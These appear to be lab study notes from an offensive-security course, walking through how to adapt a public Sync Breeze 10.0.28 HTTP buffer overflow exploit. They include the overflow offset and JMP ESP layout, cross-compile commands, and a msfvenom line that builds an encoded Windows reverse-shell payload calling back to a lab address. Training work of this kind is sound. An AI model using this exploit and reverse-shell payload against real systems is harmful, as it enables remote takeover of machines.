
## 13.1 Memory Corruption Exploit Walkthrough

##### Notes
- Example exploit is Syncbreeeze 10.0.28 buffer overflow
- Vulnerability present in sending buffer overflow coniditon in HTTP POST request

```
//Core Exploit functionality 
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```

##### Steps
1. Find relevant exploit in Searchsploit
2. Mirror exploit to allow editing 
3. Inspect function headers and import to determine necessary OS compilier 
4. Compile/cross-compile exploit 
	1. Kali cross compiler = mingw-w64
	2. if compilier fails, probably need to import modules (use google)
5. Spin up service in Offsec testing range 
6. Open service in debugger, set necessary breakpoints, and troubleshoot exploit2
7. Make necessary changes
	1. IP, Port, etc
	2. NOP sled length
	3. Shellcode 
8. Recompile and run

###### Code

```
1. searchsploit "Sync Breeze Enterprise 10.0.28"

2. searchsploit -m <exploit number>

3. //Open exploit and inspect #include headers

4.1 sudo apt install mingw-w64

4.2 i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

5. rdesktop 192.168.129.10 -u offsec -p lab -g 80%+150+100

6. //go into services, start syncrbreeze, attach to debugger (file -> attach)

7.1 //inspect uncompiled code

7.2 //inspect debugger and look at ESP return address (often just need to change the buffer size by 1 or 2 bytes)

7.3 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"

```


## 13.2 Fixing Web Exploits